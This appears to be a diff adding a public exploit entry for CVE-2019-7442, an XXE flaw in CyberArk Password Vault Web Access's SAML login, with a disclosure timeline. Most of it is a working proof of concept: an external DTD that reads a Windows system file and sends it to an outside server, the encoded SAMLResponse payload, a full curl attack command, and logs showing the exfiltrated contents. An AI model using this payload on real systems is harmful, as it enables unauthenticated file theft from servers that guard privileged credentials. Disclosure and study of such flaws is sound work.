@@ -1,0 +1,97 @@
+# Exploit Title: CyberArk XML External Entity (XXE) Injection in SAML
+authentication
+# Date: 10/05/2019
+# Exploit Author: Marcelo Toran (@spamv)
+# Vendor Homepage: https://www.cyberark.com
+# Version: <=10.7
+# CVE : CVE-2019-7442
+
+
+-----------Product description
+The CyberArk Enterprise Password Vault is a privileged access security
+solution to store, monitor and rotate credentials. The main objective
+of the solution is protecting the privileged accounts that are used to
+administrate the systems of the organisations.
+
+-----------Vulnerability description
+This vulnerability allows remote attackers to disclose sensitive
+information or potentially bypass the authentication system.
+
+-----------Vulnerability Details
+# Exploit Title: XML External Entity (XXE) Injection in SAML authentication
+# Affected Component: Password Vault Web Access (PVWA)
+# Affected Version: <=10.7
+# Vendor: CyberArk
+# Vendor Homepage: https://www.cyberark.com
+# Date: 18/12/2018
+# CVSS Base Score: 7.5 (High)
+# CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+# Exploit Author: Marcelo Torán (Nixu Corporation)
+# CVE: CVE-2019-7442
+# CVE URL: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7442
+
+-----------Technical Description
+It has been found that the XML parser of the SAML authentication
+system of the Password Vault Web Access (PVWA) is vulnerable to XML
+External Entity (XXE) attacks via a crafted DTD. No user interaction
+or privileges are required as the vulnerability is triggered in
+pre-authentication.
+The vulnerable component is: https://example.com/PasswordVault/auth/saml
+The vulnerable argument: SAMLResponse
+
+-----------POC
+
+# pepe.dtd is an external entity stored in a remote web server where we define the file that will be read and the server that will be used for the exfiltration:
+<!ENTITY % data SYSTEM "file:///C:/Windows/win.ini">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://externalserver.com/?%data;'>">
+ 
+ 
+# The malicious XML payload where is defined the address of the external entity defined in the previous step:
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "http://externalserver.com/pepe.dtd">
+%sp;
+ 
+%param1;
+ 
+]>
+<r>&exfil;</r>
+ 
+ 
+# XML payload base64 encoded + equal symbols URL encoded:
+PCFET0NUWVBFIHIgWwo8IUVMRU1FTlQgciBBTlkgPgo8IUVOVElUWSAlIHNwIFNZU1RFTSAiaHR0cDovL2V4dGVybmFsc2VydmVyLmNvbS9wZXBlLmR0ZCI+CiVzcDsKJXBhcmFtMTsKXT4KPHI+JmV4ZmlsOzwvcj4%3d
+ 
+ 
+# CURL command to exploit the XXE:
+curl -i -s -k  -X $'POST' \
+    -H $'Host: example.com' -H $'User-Agent: PoC CyberArk XXE Injection :(' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 177' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
+    --data-binary $'SAMLResponse=PCFET0NUWVBFIHIgWwo8IUVMRU1FTlQgciBBTlkgPgo8IUVOVElUWSAlIHNwIFNZU1RFTSAiaHR0cDovL2V4dGVybmFsc2VydmVyLmNvbS9wZXBlLmR0ZCI+CiVzcDsKJXBhcmFtMTsKXT4KPHI+JmV4ZmlsOzwvcj4%3d' \
+    $'https://example.com/PasswordVault/auth/saml/'
+ 
+ 
+# Checking the logs of the external server:
+example.com - - [XX/XX/XX XX:XX:XX] "GET /pepe.dtd HTTP/1.1" 200 -
+example.com - - [XX/XX/XX XX:XX:XX] "GET /?;%20for%2016-bit%20app%20support%0D%0A%5Bfonts%5D%0D%0A%5Bextensions%5D%0D%0A%5Bmci%20extensions%5D%0D%0A%5Bfiles%5D%0D%0A%5BMail%5D%0D%0AMAPI=1 HTTP/1.1" 200 -
+ 
+ 
+# And decoding the content of the logs it's possible to read the requested file of the machine:
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+
+-----------Timeline
+18/12/2018 – Vulnerability discovered
+10/01/2019 – Vendor notified
+23/01/2019 – Vulnerability accepted
+05/02/2019 – CVE number requested
+05/02/2019 – CVE number assigned
+19/02/2019 – Vendor released a patch
+19/02/2019 – Advisory released
+
+-----------Proof of Concept (PoC)
+
+https://www.octority.com/2019/05/07/cyberark-enterprise-password-vault-xml-external-entity-xxe-injection/
